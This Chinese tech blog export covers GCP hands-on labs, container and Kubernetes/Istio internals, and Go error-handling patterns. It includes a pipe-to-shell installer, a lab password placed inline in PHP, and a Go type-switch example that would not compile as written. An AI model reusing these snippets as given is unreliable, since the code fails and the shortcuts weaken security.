Cloud Shell，SSH 到 my-vm-2，然后 ping 一下 my-vm-1，注意主机名： ping my-vm-1.us-central1-a 在 my-vm-2 上连接 my-vm-1： ssh my-vm-1.us-central1-a 在 my-vm-1 里上线一个网页并测试： sudo apt-get install nginx-light -y sudo vim /var/www/html/index.nginx-debian.html curl http://localhost 退出 SSH 回到 my-vm-2，访问 my-vm-1 上的网页： curl http://my-vm-1.us-central1-a/ 云上存储 # Cloud Storage # 常见的对象存储，上传文件，返回一个唯一的 URL。上传的文件按桶（bucket）组织，一旦上传便不可修改（但可以更新），访问权限则由 Cloud IAM 或更细粒度的 ACL 来控制。\nCloud Bigtable \u0026amp; Cloud Datastore # Cloud Bigtable 提供存储大量数据的 NoSQL 数据库服务，因为采用 key-value 对存储所以也可以当持久化的哈希表来用。可以通过开源的 HBase API 访问，因此也兼容 Apache Hadoop 生态。\nCloud Datastore 则是应用特化型的 NoSQL，区别主要在于对交易和类 SQL 查询的支持。当然，最重要的是有每日免费用量。\nCloud SQL \u0026amp; Cloud Spanner # Cloud SQL 提供基于 MySQL 或 PostgreSQL 的 SQL 数据库服务，并配有冗余备份、容灾恢复等功能。而 Cloud Spanner 则可以认为是高配版的 Cloud SQL，在数据一致性和可用性方面都更优秀。\n对比 # BigQuery 主要用于数据处理而不是数据存储，会在下文介绍。\nCloud Storage \u0026amp; Cloud SQL 实践 # 在 Compute Engine 里创建新的 VM instance，命名为 blogpost，允许 HTTP 入站流量，并在启动脚本中安装服务器： apt-get update apt-get install apache2 php php-mysql -y service apache2 restart 在 Cloud Shell 中创建 Cloud Storage，注意 bucket 名称需要唯一，可以用 Project ID 来确保这一点： gsutil mb -l US gs://$DEVSHELL_PROJECT_ID 从另一个桶中复制一张图片到 Cloud Shell： gsutil cp gs://cloud-training/gcpfci/my-excellent-blog.png my-excellent-blog.png ls 从 Cloud Shell 复制图片到新创建的桶： gsutil cp my-excellent-blog.png gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png 检查是否成功： gsutil ls gs://$DEVSHELL_PROJECT_ID 在控制台创建和 blogpost 同区域的 Cloud SQL，命名为 blog-db，并设置 root 密码；创建完毕后，新建一个用户，设置用户名和密码。 接下来，要让我们的 blog-db 只能被 blogpost 访问。为此，先查看 blogpost 的公网 IP，然后在 blog-db 配置面板的 Connections 选项卡里新建一个 Authorized Network，并填入这个 IP。由于要求 CIDR 格式而我们只想要单个机器能访问，填入 x.x.x.x/32 即可。 随后要让 blogpost 去使用 blog-db。SSH 到 blogpost，编写 /var/www/html/index.php： \u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Welcome to my excellent blog\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to my excellent blog\u0026lt;/h1\u0026gt; \u0026lt;?php $dbserver = \u0026#34;CLOUDSQLIP\u0026#34;; $dbuser = \u0026#34;blogdbuser\u0026#34;; $dbpassword = \u0026#34;DBPASSWORD\u0026#34;; // In a production blog, we would not store the MySQL // password in the document root. Instead, we would store it in a // configuration file elsewhere on the web server VM instance. $conn = new mysqli($dbserver, $dbuser, $dbpassword); if (mysqli_connect_error()) { echo (\u0026#34;Database connection failed:\u0026#34; . mysqli_connect_error()); } else { echo (\u0026#34;Database connection succeeded.\u0026#34;); } ?\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; 重启 apache2，访问 blogpost 的公网 IP，检查数据库连接。 接下来把之前那张图片加到网站上。在控制台 Storage -\u0026gt; Cloud Storage -\u0026gt; Browser 里找到图片，勾选 Share publicly 从而获得一个 URL（或者运行下面的命令）。随后在原来的 html 里插入图片即可。 gsutil acl ch -u allUsers:R gs://$DEVSHELL_PROJECT_ID/my-excellent-blog.png 重复第 9 步。 云上容器 # 也就是 Google Kubernetes Engine，后面单独开篇博客写。\n云上应用 # 在 Compute Engine 中，用户自己选择虚拟机作为运行应用的基础设施；到了 Kubernetes Engine，这个基础设施变成了容器。但如果我们只是想快速部署一个应用，根本不想关心基础设施呢？这就是 App Engine 的作用。\nApp Engine 提供了类似 NoSQL 数据库、负载均衡、日志记录、用户认证、自动伸缩等服务，用户只需要关心业务代码、以及如何在代码中调用这些服务。在 Standard 模式中，因为提供了免费日限额，只要应用流量不太大就相当于永久免费使用 App Engine 服务。\nStandard 模式运行在沙箱中，因此存在一些限制：\n不能向文件系统写文件，数据持久化必须通过数据库 任意网络请求最大超时时间为 60 秒 安装第三方软件也会受到限制 不过，Standard 模式只支持 Java、Python、PHP 和 Go 的 SDK，其他语言则需要使用 Flexible 模式。\nFlexible 模式不受沙箱限制，因为这种模式实际上是在 Compute Engine 上运行用户自定义的容器。这会导致启动速度变慢，但应用对底层的访问更宽松，当然价格上也不存在免费额度了。\nApp Engine 实践 # 克隆示例应用： git clone https://github.com/GoogleCloudPlatform/appengine-guestbook-python cd appengine-guestbook-python 在 app.yaml 中存储了应用的部署配置，可以先在本地运行起来测试下： dev_appserver.py ./app.yaml 用 Cloud Shell 的 Preview 功能查看应用。 确认没有问题后进行部署： gcloud app deploy ./index.yaml ./app.yaml 云上开发、部署与监控 # 云上开发 # Cloud Source Repositories，也就是 GCP 中的 Git Repositories，优势在于和 GCP Project 以及其他产品的融合 Cloud Functions，也就是 GCP 中的云函数，这种方式目前可以说是对一个应用而言最高层面的抽象 Cloud Endpoint，也就是 GCP 中用于维护 API 的服务 云上部署 # Deployment Manager 提供了声明式的方式来设定部署环境，有点像 Kubernetes deployment，也可以把设定文件放在 Cloud Source Repositories 里 云上监控 # Stackdriver 用于监控云上资源，没有发现什么有特色的地方？ 云上部署与监控实践 # 准备环境，下载 Deployment Manager 的模版： export MY_ZONE=us-central1-a gsutil cp gs://cloud-training/gcpfcoreinfra/mydeploy.yaml mydeploy.yaml 替换模版中的字段： sed -i -e \u0026#34;s/PROJECT_ID/$DEVSHELL_PROJECT_ID/\u0026#34; mydeploy.yaml sed -i -e \u0026#34;s/ZONE/$MY_ZONE/\u0026#34; mydeploy.yaml 最终模版大约是这样的： resources: - name: my-vm type: compute.v1.instance properties: zone: us-central1-a machineType: zones/us-central1-a/machineTypes/n1-standard-1 metadata: items: - key: startup-script value: \u0026#34;apt-get update\u0026#34; disks: - deviceName: boot type: PERSISTENT boot: true autoDelete: true initializeParams: sourceImage: https://www.googleapis.com/compute/v1/projects/debian-cloud/global/images/debian-9-stretch-v20180806 networkInterfaces: - network: https://www.googleapis.com/compute/v1/projects/qwiklabs-gcp-dcdf854d278b50cd/global/networks/default accessConfigs: - name: External NAT type: ONE_TO_ONE_NAT 部署： gcloud deployment-manager deployments create my-first-depl --config mydeploy.yaml 查看已部署的 Compute Engine。 编辑模版中的 startup script，更新为： value: \u0026#34;apt-get update; apt-get install nginx-light -y\u0026#34; 执行更新： gcloud deployment-manager deployments update my-first-depl --config mydeploy.yaml 检查 Compute Engine 中新的 startup script。 停止虚拟机，设置 Service account 为 Compute Engine default service account 并 Allow full access to all Cloud APIs。启动虚拟机。 SSH 到虚拟机，运行如下命令增加 CPU 负载： dd if=/dev/urandom | gzip -9 \u0026gt;\u0026gt; /dev/null \u0026amp; 控制台中为 Project 开启 Monitoring Workspace（自动），随后在虚拟机中安装 agent： curl -sSO https://dl.google.com/cloudagents/install-monitoring-agent.sh sudo bash install-monitoring-agent.sh curl -sSO https://dl.google.com/cloudagents/install-logging-agent.sh sudo bash install-logging-agent.sh 控制台 Monitoring 面板中点击 Metrics Explorer -\u0026gt; Metric，选择虚拟机资源和 CPU 使用情况并查看图表。 运行 kill %1 停止占用 CPU，再次查看图表。 云上数据处理 # Cloud Dataproc，用于在 GCP 上运行 Hadoop、Spark、Hive、Pig 等数据集群 Cloud Dataflow，用于构建数据流水线，提供了资源自动伸缩的功能，相比 Cloud Dataproc 更灵活 BigQuery，顾名思义，提供针对大量数据提供高速 SQL 查询服务 Cloud Pub/Sub，提供可靠的、多对多的异步消息推送 / 拉取服务 Cloud Datalab，也就是 GCP 中的 Jupyter Notebook，底层基础设施使用的是 BigQuery、Compute Engine 和 Cloud Storage Cloud ML，也就是在 GCP 上运行 TensorFlow，好处是可以利用 GCP 上的高性能计算资源 BigQuery 实践 # 在 BigQuery 中新建数据集 logdata，随后创建表 accesslog，数据源来自 Cloud Storage，URL 为 gs://cloud-training/gcpfci/access_log.csv。 创建完成后，在表详情页面可以 Preview 一些数据。 在控制台运行 query： select int64_field_6 as hour, count(*) as hitcount from logdata.accesslog group by hour order by hour 类似上一步的查询也可以用 bq 命令行工具完成： bq query \u0026#34;select string_field_10 as request, count(*) as requestcount from logdata.accesslog group by request order by requestcount desc\u0026#34; Network 和 Subnetwork # Network 是跨 Region 的，拥有自己的 DNS。处于同一 Network 的虚拟机之间，即使处于不同 Region，也可以通过内网 IP 互相通信。同理，同一 Region 中的虚拟机，如果不处于同一 Network，就无法通过内网 IP 通信。\n同理，Subnetwork 是跨 Zone 的。处于同一 Subnetwork 的虚拟机之间，即使处于不同 Zone，也可以通过内网 IP 通信。Subnetwork 实际上就是通常意义下的子网，也就是 RFC 1918。Subnetwork 只能扩展不能缩小。\nDNS # Network 内部的 DNS 是为了确保虚拟机内部 IP 变化时，对虚拟机的访问不受影响。这一点和 K8s 如出一辙。至于 IP 地址、路由，也和通常意义下的差不多。\n防火墙 # 每个 VPC 实际上就是一个分布式防火墙，只不过出入控制是虚拟机级的。也就是说，不仅整个网络受到防火墙保护，每个虚拟机也是如此。这使得防火墙规则也可以针对每个虚拟机进行不同设置。\n最后，保底规则是拒绝全部 Ingress 请求，允许全部 Egress 请求。防火墙规则也遵循上文提到的资源层级树层层继承。\n多网卡 # 每个虚拟机在创建时可以指定多个网卡，从而接入多个不同的 Network。不过，Network 内部的 DNS 只能解析到 nic0 也就是第一个网卡，如果 nic0 并不对应该 Network，DNS 解析会失效。\n多网络 # Shared VPC 可以连接多个不同 Project 的计算资源，使得计算资源之间可以通过内网 IP 通信。类似地，VPC Network Peering 可以跨 Organiztion 连接计算资源，实现点对点的连接。两者最大的区别在于，网络管理是否是中心化的。\nShared VPC VPC Network Peering 跨 Organization ❎ ✅ 连接同一 Project 内的资源 ❎ ✅ 网络管理模式 中心化 去中心化 负载均衡 # 负载均衡是基于虚拟机实例组的，类似于 K8s 里的一个 ReplicaSet，甚至也包含了自动伸缩、滚动更新、健康检查等功能。一个虚拟机实例组一般在同一 Region 内。\nHTTP(S) 负载均衡器将用户请求发送至 HTTP(S) 代理，随后转发给 backend service，最终发送到不同 Region 的实例组。对于非 HTTP 请求，则可以使用 TCP 和 SSL 负载均衡器。如果需要发送 UDP 请求或者 TCP 和 SSL 负载均衡器不支持的请求，则可以使用适用范围更广的 Network 负载均衡器。最后，如果服务不需要对公网开放，则可以使用同样支持 TCP / UDP 请求，但速度更快、配置更简单的内网负载均衡器（基于 Andromeda）。\n可以通过如下流程图来选择合适的负载均衡器：\n","date":"2021-09-23","permalink":"/posts/gcp/","section":"Posts","summary":"\u003cp\u003e待更新。\u003c/p\u003e","title":"高枕无忧：Google Cloud Platform 基础"},{"content":"精密而复杂。\n容器 # Namespace # Linux 采用 Namespace 技术进行资源隔离，可以为不同进程分配不同的 Namespace，有点类似沙箱的概念。在 Linux 进程的数据结构中，nsproxy 结构体负责管理 Namespace：\nstruct nsproxy { atomic_t count; struct uts_namespace *uts_ns; struct ipc_namespace *ipc_ns; struct mnt_namespace *mnt_ns; struct pid_namespace *pid_ns_for_children; struct net *net_ns; } 默认情况下父子进程共享 Namespace，但也可以通过调用 clone、setns、unshare 等方法手动指定和修改 Namespace。\n以上面结构体的 pid_namespace 为例，两个不同的 PID Namespace 下的进程之间是互不影响的。类似的，网络、文件系统、用户、挂载点等的 Namespace 之间也同理。\n可以看到，Docker 实际上就是对 Namespace 的一次封装，因此在宿主机上调试 Docker 内部程序时，也可以借助 Namespace 的命令行工具。先获取对应容器的 PID：\n$ docker inspect [docker id] | grep pid 再用 nsenter 进入对应的 Namespace，例如进入网络 Namespace 使用 -n：\n$ nsenter -t [pid] -n [cmd] 容器实际上仅仅是设置了 Namespace 的特殊进程，这使得它不存在虚拟化带来的性能损耗，但也使得不同容器必须共享一个宿主机 OS 内核。\nCgroups # Cgroups 对进程使用的计算资源进行管控，对不同类型的资源采用不同子系统，并在子系统中采用层级树结构（/sys/fs/cgroup）。\n🌰 限制进程使用的 CPU 资源 # 首先进入 cpu 子系统，将进程加入 cgroup：\n$ cd /sys/fs/cgroup/cpu $ echo [pid] \u0026gt; cgroup.procs 随后关注 cpu.cfs_quota_us 和 cpu.cfs_period_us，两者的比值即进程能占用 CPU 资源的最高比例，默认值为 -1（无限制） 和 100000。\n例如，设置最多占用 25% CPU 资源：\n$ echo 25000 \u0026gt; cpu.cfs_quota_us 然而，如果在容器内执行 top 等系统监控命令，由于会读取 /proc 下的信息，实际获取的是宿主机的指标。这一问题可以通过 lxcfs 解决。\nUnionFS # 顾名思义，UnionFS 可以对文件系统 “取并集”，也就是将不同目录挂载到同一个虚拟文件系统下。\n经典的 Linux 系统中，使用 bootfs 中的 BootLoader 引导加载 Kernel 到内存中，然后 umount 掉 bootfs。Kernel 加载完成后，就会使用我们熟悉的 rootfs 文件系统（/）。启动时先将 rootfs 设为 readonly 进行检查，随后再设为 readwrite 供使用。\n而在 Docker 启动时，检查完 readonly 的 rootfs 后会再 union mount 一个 readwrite 的文件系统，称为一个 FS 层。后续会继续添加 readwrite 的 FS 层，每次添加时将当前最顶层的 FS 层设为 readonly。这实际上就是 docker build 根据 Dockerfile 中每一行的指令堆叠 FS 层的过程。\n那么如果要修改下层 readonly FS 层的文件怎么办呢？只需要 Copy-on-Write，将文件复制到可写的顶层并修改即可。如果是删除，则需要在可写的顶层创建 .wh. 开头的文件用来 whiteout 下层的同名文件。这样能成功是因为 Docker 采用的 OverlayFS 在合并上下层同名文件时，优先选择上层文件。\n最后，FS 层可以在不同镜像之间复用，节省镜像构建时间和硬盘占用。\nServerless # 服务端运维发展 # Serverfull 阶段，研发和运维完全隔离，运维完全靠人力处理，效率低下 DevOps 阶段，研发接替了运维的部分工作，运维工具化，一定程度上提升了效率 Serverless 阶段，运维完全自动化（NoOps），最终实现服务端免运维 FaaS # Serverless 并不是指不需要服务器，而是指对服务器运维的极端抽象。我们知道，在程序设计领域发生的抽象，都是为了降低开发难度和成本、让开发者更专注于真正有价值的工作。因此，Serverless 主要是针对后端运维进行的一种优化。\nServerless 首先提出的概念是函数即服务 FaaS，它是一种临时的 Runtime，用于运行无状态函数以便自动扩缩容。FaaS 是事件驱动的，大体可以分成函数代码、函数服务、触发器三个部分。\n触发器接收用户请求并通知函数服务。实际上是对负载均衡、反向代理等中间件工作的抽象 函数服务收到消息后，检查是否有可用的函数实例，没有则从仓库拉取函数代码来初始化一个新的函数实例；最后将用户请求作为函数参数，执行函数实例，返回的结果将原路返回。实际上是对代码运行环境的抽象 函数代码一般在 git 之类的版本控制仓库。实际上是对代码上传和部署的抽象 弹性伸缩 # 值得一提的是，FaaS 能根据目前负载对占用资源进行弹性伸缩，无负载时甚至可以不占用资源（相比之下，PaaS 通常无法缩容至 0）。这能够很大程度上提升资源利用率。\n冷启动 # 冷启动和热启动相反，从一个未初始化的服务开始，直到函数实例执行完毕结束。由于可能涉及比较繁琐的初始化工作，传统服务也许能够在热启动上达到很快的速度，但在冷启动上不行。\nFaaS 则通过容器、运行环境、代码三者分层并分别缓存，获得了较快的冷启动速度，一般大约在几百毫秒内。显然，这是牺牲了用户对底层环境的可控性以及应用场景换来的。\n例如，由于分层的结构，FaaS 可以预先下载代码，并构建镜像缓存，这一流程通常称为“预热”。\n语言无关性 # FaaS 可以替换传统前后端分离开发中的后端服务、可以用来请求公开的 Web API、更重要的是可以和其他云服务商提供的服务进行联动。由于前端只在意最后返回的数据，我们的函数服务完全可以混合采用多种不同的语言来编写，以适应不同的需求，服务编排也更灵活。\n进程模型 # FaaS 存在两种进程模型：用完即毁（无状态）和常驻进程（有状态），前者使用得更多也更符合 FaaS 的定位。后者则更适合传统 MVC 应用的迁移，但会增加冷启动时间。\n数据库？ # 实际上，FaaS 中的函数实例都活不了太久，有的执行完就被销毁了，而有的可能能在内存中多待一会儿，但云服务商经过一小段时间后仍会销毁它们，这是因为 FaaS 需要弹性伸缩，它的核心是无状态的函数（就像 HTTP 协议是无状态的一样）。\n这就给数据持久化带来了问题，比如数据库就不能放在 FaaS 的主进程中。但把数据库单独拿出来，再通过一个进程去连接并访问它，这样又会显著增加冷启动的时间。\n解决办法就是不再连接数据库，而是通过 RESTful API 访问数据库。这里的 RESTful API 实际上就是一种后端即服务 BaaS 了，它提供了访问后端数据库的接口，使得 FaaS 不再需要考虑数据持久化的问题。\n实际应用中，加工来自后端的数据供前端使用的功能被封装为 BFF（Backend For Frontend） 层，这一层也可以使用 FaaS 来实现。\nBaaS # BaaS 和 FaaS 的区别在于，BaaS 可以运行第三方服务并持久化数据。\n后端 BaaS 化为了降低运维成本，往往会将复杂业务逻辑拆分成单一职责的微服务，形成微服务架构。这就要求各微服务之间相对独立，意味着每个服务的数据库也需要解耦合。对这类分布式数据库而言，最重要的就是解决数据一致性的问题，例如通过消息队列或是 Raft 协议等。\n值得一提的是，FaaS 和 BaaS 的底层实际上使用容器技术实现，所以我们可以在本地用 Kubernetes 搭建自己的 Serverless 平台（见后文 Kubernetes 部分）。\n缺点 # 技术尚不成熟，许多云服务商提供的 Serverless 服务存在不少 bug Serverless 平台对开发者来说是个黑盒子，想在上面调试代码、排查问题，需要付出极大成本 同理，Serverless 平台上的运行时环境只支持部分定制 每次部署代码都需要压缩代码后上传，较繁琐 云服务商提供的生态（如代码调试工具）都是封闭的，形成 Vendor-lock；这一点可能可以通过 Serverless、Midway FaaS 等框架解决 Kubernetes # 架构 # K8s 用来管理容器集群，它的好处在 官方文档 里已经写得很清楚了，而它的原理大致可以概括为一张架构图：\n通过 CLI 工具 kubectl，我们可以访问到运行在 K8s Master Node 上的 API Server，也是整个集群的核心。Node 实际上是对计算资源的一种抽象，每个 Node 上运行一个或多个 Pod，即应用实例。一般情况下，一个 Pod 上推荐运行一个容器。\n在 Master Node 上还有键值数据库 etcd、监视 Pod 的调度器 Scheduler、不同类型的控制器 Controller Manager 以及连接云服务厂商 API 的 Cloud Controller Manager。\n而在普通 Node 上则运行了一个 kubelet，负责通知 API Server 容器运行状态。此外，为了让外界能够访问到容器运行的服务，需要用 K8s Service 通过 kube-proxy 暴露该服务。\n最后，不同的 K8s 集群之间通过 Namespace 隔离，注意这和上文写容器技术时提到的 Linux Namespace 并非同一概念，尽管思想是相似的。\n安装 # K8s 的安装令人惊讶地简单。就像我们在架构图中看到的那样，安装 K8s 主要分为安装 kubectl 和 安装 K8s 集群两个步骤。\n安装 K8s 集群 # 第一种方式是通过 Docker Desktop 安装。实际上 Docker Desktop 自带了 K8s（不是最新版本，但也比较新），在设置里勾选即可。\n第二种方式是通过 kubeadm、minikube、kind 等工具安装，无论哪种方式都比较简单，这里以 minikube 为例。\nminikube 内置了 kubectl，所以之后可以选择不另外安装 kubectl。\n按照 官方文档，直接 install 二进制文件即可。\n$ curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-darwin-amd64 $ sudo install minikube-darwin-amd64 /usr/local/bin/minikube 安装 kubectl # brew install kubectl，没了。\n然而需要注意的是，kubectl 版本和 K8s 集群版本之间相差不能超过 0.0.2，否则容易出现不兼容的情况。例如，如果用 Docker Desktop 安装的 1.21.4 版本的集群，则需要手动安装：\n$ curl -LO \u0026#34;https://dl.k8s.io/release/v1.21.4/bin/darwin/arm64/kubectl\u0026#34; $ chmod +x ./kubectl $ sudo mv ./kubectl /usr/local/bin/kubectl $ sudo chown root: /usr/local/bin/kubectl 实践 # 首先设置好别名，方便后续操作（这里直接使用了 minikube 内置的 kubectl）：\nalias k=\u0026#34;minikube kubectl --\u0026#34; alias dps=\u0026#34;docker ps -a\u0026#34; alias dr=\u0026#34;docker rm -f\u0026#34; alias dil=\u0026#34;docker image ls\u0026#34; alias dir=\u0026#34;docker image rm\u0026#34; alias ds=\u0026#34;docker start\u0026#34; alias dx=\u0026#34;docker exec -it\u0026#34; alias mk=\u0026#34;minikube\u0026#34; 启动 minikube：\n$ mk start 部署应用并检查：\n$ k create deploy echo-server --image=k8s.gcr.io/echoserver-arm:1.8 $ k get deploy # result: NAME READY UP-TO-DATE AVAILABLE AGE echo-server 1/1 1 1 1m 因为是 M1 芯片，所以用的 ARM 镜像。\n检查 Pod 情况：\n$ k get po # result: NAME READY STATUS RESTARTS AGE echo-server-9f4db688c-r288r 1/1 Running 0 89 暴露服务并检查：\n$ k expose deploy echo-server --type=LoadBalancer --port=8080 $ k get svc # result: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE echo-server LoadBalancer 10.111.217.237 \u0026lt;pending\u0026gt; 8080:31389/TCP 1m kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 100m 这里暴露了一个 LoadBalancer 类型的服务，也可以换成 NodePort 类型服务。8080 是我们的 echoserver 容器内的服务端口。\n此外，可以发现还有一个 kubernetes 服务，这就是 K8s 集群的 API Server。\n为了访问暴露的服务，可以手动端口转发，也可以通过 minikube 自动访问：\n$ mk service echo-server 注意到上面 echo-server 的 EXTERNAL-IP 还在等待分配，我们还可以用 mk tunnel 建立隧道从而分配外部访问的 IP。\n上述信息也可以通过 Dashboard 图形化界面查看：\n$ mk dashboard 有趣的是，K8s 服务也是由 K8s 自己管理的，它运行在 kube-system 的 Namespace 中。\n$ k get po,svc -n kube-system # result: NAME READY STATUS RESTARTS AGE pod/coredns-78fcd69978-xlh28 1/1 Running 0 141m pod/etcd-minikube 1/1 Running 0 142m pod/kube-apiserver-minikube 1/1 Running 0 142m pod/kube-controller-manager-minikube 1/1 Running 0 142m pod/kube-proxy-gblfw 1/1 Running 0 141m pod/kube-scheduler-minikube 1/1 Running 0 142m pod/storage-provisioner 1/1 Running 1 (141m ago) 142m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/kube-dns ClusterIP 10.96.0.10 \u0026lt;none\u0026gt; 53/UDP,53/TCP,9153/TCP 142m 对于其他平台，kubectl 命令不变，替换上述 mk 相关命令即可。\nService Mesh # 微服务架构中，微服务之间必须要通信，导致微服务通信相关代码和业务代码的强耦合。Service Mesh 正是为了抽离出微服务通信的逻辑，让开发者专注于业务代码编写。它在数据面板中通过 Sidecar 劫持微服务 Pod 的流量，从而接管了整个网络通信的功能。\nIstio 安装 # Kubernetes 采用 Istio 作为 Server Mesh，首先下载并安装，安装前记得给 Docker Desktop 或 minikube 分配 8 - 16 G 内存：\n$ curl -L https://istio.io/downloadIstio | sh - $ mv istio-1.11.2/bin/istioctl /usr/local/bin $ istioctl install --set profile=demo -y 令人痛心的是，Istio 官方 并不支持、也 不打算支持 ARM 架构，因此在 M1 下安装时不能直接使用最后一行命令自动化安装，而需要借助 这个社区版镜像，自己编写 Operator 进行安装：\napiVersion: install.istio.io/v1alpha1 kind: IstioOperator metadata: namespace: istio-system name: arm-istiocontrolplane spec: hub: docker.io/querycapistio profile: demo components: pilot: k8s: # each components have to set this affinity: \u0026amp;affinity nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - preference: matchExpressions: - key: beta.kubernetes.io/arch operator: In values: - arm64 - amd64 weight: 2 requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: beta.kubernetes.io/arch operator: In values: - arm64 - amd64 egressGateways: - name: istio-egressgateway k8s: affinity: *affinity enabled: true ingressGateways: - name: istio-ingressgateway k8s: affinity: *affinity enabled: true 将这个 Operator 保存为 install-istio.yml，随后 istioctl install -f ./install-istio.yml 完成安装。\nUpdate: Istio 1.15 已支持 ARM64 架构。\n应用部署 # 安装完成后，记得开启 Sidecar 注入来劫持流量：\n$ k label ns default istio-injection=enabled 随后即可部署应用并查看状态：\n$ k apply -f samples/bookinfo/platform/kube/bookinfo.yaml $ k get po # result: NAME READY STATUS RESTARTS AGE details-v1-79f774bdb9-ns6gl 2/2 Running 0 76s productpage-v1-6b746f74dc-qp7mg 2/2 Running 0 76s ratings-v1-b6994bb9-mflsk 2/2 Running 0 76s reviews-v1-545db77b95-24tsl 2/2 Running 0 76s reviews-v2-7bf8c9648f-b8bq4 2/2 Running 0 76s reviews-v3-84779c7bbc-hxkxg 2/2 Running 0 76s $ k get svc # result: NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE details ClusterIP 10.102.117.210 \u0026lt;none\u0026gt; 9080/TCP 105s kubernetes ClusterIP 10.96.0.1 \u0026lt;none\u0026gt; 443/TCP 27m productpage ClusterIP 10.101.203.214 \u0026lt;none\u0026gt; 9080/TCP 105s ratings ClusterIP 10.105.60.88 \u0026lt;none\u0026gt; 9080/TCP 105s reviews ClusterIP 10.100.137.99 \u0026lt;none\u0026gt; 9080/TCP 105s 最后，检查实际应用是否正常运行：\n$ k exec \u0026#34;$(k get po -l app=ratings -o jsonpath=\u0026#39;{.items[0].metadata.name}\u0026#39;)\u0026#34; -c ratings -- curl -sS productpage:9080/productpage | grep -o \u0026#34;\u0026lt;title\u0026gt;.*\u0026lt;/title\u0026gt;\u0026#34; # result: \u0026lt;title\u0026gt;Simple Bookstore App\u0026lt;/title\u0026gt; 上述命令的意思是：在 ratings 对应的 pod 中的 ratings 容器里运行 curl -sS productpage:9080/productpage 发起请求，并在返回的 html 中查找标题。需要这么复杂是因为此时我们的服务还没有外部 IP，只能在集群内部访问。\n通过 Ingress 网关让应用能够从外部访问 # 首先部署好设置了网关的应用并检查：\n$ k apply -f samples/bookinfo/networking/bookinfo-gateway.yaml $ istioctl analyze 获取主机、http2 端口和 https 端口：\n$ export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath=\u0026#39;{.status.loadBalancer.ingress[0].ip}\u0026#39;) $ export INGRESS_PORT=$(k -n istio-system get svc istio-ingressgateway -o jsonpath=\u0026#39;{.spec.ports[?(@.name==\u0026#34;http2\u0026#34;)].port}\u0026#39;) 如果设置完后 $INGRESS_HOST 为空，说明 LoadBalancer 此时的地址为主机名而不是 IP，只需要修改一下设置即可：\n$ export INGRESS_HOST=$(k -n istio-system get svc istio-ingressgateway -o jsonpath=\u0026#39;{.status.loadBalancer.ingress[0].hostname}\u0026#39;) 随后访问 http://$INGRESS_HOST:$INGRESS_PORT 即可。\n通过 Kiali 查看图形化界面 # 安装 Kiali、Prometheus、Grafana、Jarger 等插件，检查部署状态：\n$ k apply -f samples/addons/ $ k rollout status deploy kiali -n istio-system 随后就可以查看图形化界面了：\n$ istioctl dashboard kiali 编写脚本产生流量：\nfor i in $(seq 1 100); do curl -s -o /dev/null \u0026#34;http://localhost/productpage\u0026#34;; done 最后就可以看到整个 Service Mesh 的架构、以及网络请求数据流了，非常清晰。\n","date":"2021-09-10","permalink":"/posts/cloud-native/","section":"Posts","summary":"\u003cp\u003e精密而复杂。\u003c/p\u003e","title":"风谲云诡：云原生技术原理"},{"content":"底层包装、中层传递、顶层处理。\nSentinel Errors # go 中存在一些预定义的错误，比如 io.EOF，在使用时通常用 if err == io.EOF 的形式来比较两个错误是否 “相等”。然而，如果错误中需要携带一些错误信息，就不得不采用如下两种方法之一：\n返回一个不同的、携带了错误信息的错误。这会导致在和 Sentinel Error 比较时， == 失效。 用 fmt.Errorf()，同样会导致 == 失效。 此时，我们只能使用 error.Error() 来在程序中判断错误类型，然而这个方法设计初衷仅仅是为了提供错误信息。\n除此之外，如果在编写 API 时使用 Sentinel Error，则该 Error 会成为 API 的公共部分。同时，也会仅仅因为需要判断一个错误而引入一个不必要的依赖。由于上述三个缺点，我们需要尽量避免使用 Sentinel Error。\nCustom Errors # 通过实现 error 接口来自定义错误类型：\ntype MyError struct { Msg string File string Line int } func (e *MyError) Error() string { return fmt.Sprintf(\u0026#34;%s:%d %s\u0026#34;, e.File, e.Line, e.Msg) } func test() error { return \u0026amp;MyError{\u0026#34;Somthing happened\u0026#34;, \u0026#34;server.go\u0026#34;, 42} } func main() { err := test() switch Err := err.(type) { case nil: // success case *MyError: fmt.Println(\u0026#34;error in line:\u0026#34;, err.Line) default: // unknown } } 这种做法能够返回额外的错误信息，然而并没有解决 Sentinel Error 的第二个问题，因此也不推荐在编写 API 时过多使用。\nOpaque Errors # 不透明就是指当前函数知道发生了错误，但并不清楚除此以外的任何细节。实际上就是：\nfunc fn() error { //... if err != nil { return err } // ... } 但是如果我们确实需要在当前函数里获取错误的一些细节呢？此时我们不应该考虑去判断错误的类型或值，而是判断错误是否执行了某些行为：\npackage net type Error interface { error Timeout() bool Temporary() bool } if nerr, ok := err.(net.Error); ok \u0026amp;\u0026amp; nerr.Temporary() { // handle error } 实际应用中，可以单独编写函数来判断错误执行的行为：\ntype temporary interface { Temporary() bool } func IsTemporary(err error) bool { te, ok := err.(temporary) return ok \u0026amp;\u0026amp; te.Temporary() } 这种做法使得我们不需要导入定义错误的包，也不需要了解错误的类型信息，相对灵活。只不过，它仍然不能解决如何返回错误信息的问题。\nWrap Errors # 为了彻底解决上述问题，我们可以使用 github.com/pkg/errors 包。它提供了：\nWrap() 方法来包装错误、错误信息和堆栈信息 Cause() 方法来解包装以得到原来的错误本身 WithMessage() 方法仅包装错误和错误信息 这使得我们既能够获得错误本身、又能够获得错误信息，使用起来很方便：\n在业务代码中，一般使用 errors.New() 产生错误 在业务代码中与其他包协作时，使用 errors.Wrap() 包装错误 需要与 Sentinel Errors 比较时，调用 errors.Cause() 获取原始错误 调用其他包中的方法时，直接返回错误本身 在程序顶层处理捕获到的错误，例如可以用 %+v 打印堆栈信息 在非业务代码中（如编写库时），只能返回原始错误 错误被处理后，不能再被继续返回 